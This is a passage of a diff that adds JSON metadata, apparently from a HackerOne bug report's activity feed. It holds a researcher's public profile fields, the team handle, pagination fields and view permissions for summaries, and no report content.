+        "username": "medmahmoudi",
+        "cleared": false,
+        "verified": true,
+        "url": "/medmahmoudi",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/4j3g59ickevgfs0f2vgcn552wjxw/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
